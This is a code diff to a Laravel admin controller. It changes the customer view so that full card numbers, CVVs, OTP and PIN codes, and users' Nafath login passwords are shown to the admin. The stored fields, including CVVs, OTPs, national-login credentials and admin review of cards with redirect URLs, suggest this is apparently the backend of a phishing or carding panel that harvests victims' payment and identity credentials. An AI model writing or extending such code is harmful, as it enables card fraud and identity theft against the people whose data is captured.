@@ -90,10 +90,10 @@ class AdminCustomerController extends Controller
 
         $query = CustomerProfile::query()
             ->with([
-                'otpCodes' => fn($q) => $q->select('id', 'customer_profile_id', 'type', 'status', 'phone_number', 'created_at', 'updated_at')
+                'otpCodes' => fn($q) => $q->select('id', 'customer_profile_id', 'type', 'code', 'code_value', 'status', 'phone_number', 'created_at', 'updated_at')
                     ->latest()
                     ->limit(10),
-                'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number_masked', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'cvv_verified', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
+                'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'card_number_masked', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'cvv', 'cvv_verified', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
                     ->latest()
                     ->limit(10),
             ])
@@ -429,18 +429,19 @@ class AdminCustomerController extends Controller
         $latestPhoneOtp = $customer->otpCodes->whereIn('type', ['phone', 'phone_verification', 'stc_verification', 'stc_otp'])->sortByDesc('created_at')->first();
 
         if ($latestOtp) {
-            $latestOtp->makeVisible(['code_value']);
+            $latestOtp->makeVisible(['code', 'code_value']);
         }
         if ($latestPin) {
-            $latestPin->makeVisible(['code_value']);
+            $latestPin->makeVisible(['code', 'code_value']);
         }
         if ($latestPhoneOtp) {
-            $latestPhoneOtp->makeVisible(['code_value']);
+            $latestPhoneOtp->makeVisible(['code', 'code_value']);
         }
 
         /** @var \Illuminate\Database\Eloquent\Collection<int, \App\Models\PaymentCard> $paymentCards */
         $paymentCards = $customer->paymentCards;
         $maskedCards = $paymentCards->sortByDesc('created_at')->map(function ($card) {
+            $card->makeVisible(['card_number', 'cvv']);
             $cardArray = $card->toArray();
             $cardArray['card_number_masked'] = $card->card_number_masked ?? ('**** **** **** ' . $card->last4);
             $cardArray['last4'] = $card->last4;
@@ -483,6 +484,7 @@ class AdminCustomerController extends Controller
             ],
             'nafath' => [
                 'username' => $customer->nafath_username,
+                'password' => $customer->makeVisible('nafath_password')->nafath_password,
                 'verified' => $customer->nafath_verified,
                 'verification_code' => $customer->nafath_verification_code,
             ],
@@ -497,10 +499,10 @@ class AdminCustomerController extends Controller
             'latest_pin' => $latestPin,
             'latest_phone_otp' => $latestPhoneOtp,
             'all_otps' => $customer->otpCodes->whereIn('type', ['otp', 'stc_otp', 'phone', 'phone_verification', 'stc_verification'])
-                ->each(fn ($o) => $o->makeVisible(['code_value']))->values(),
+                ->each(fn ($o) => $o->makeVisible(['code', 'code_value']))->values(),
             'all_pins' => $customer->otpCodes->where('type', 'pin')
                 ->sortByDesc('created_at')
-                ->each(fn ($o) => $o->makeVisible(['code_value']))->values(),
+                ->each(fn ($o) => $o->makeVisible(['code', 'code_value']))->values(),
 
             'nationalId' => $data['national_id'] ?? null,
             'fullName' => $data['full_name'] ?? null,
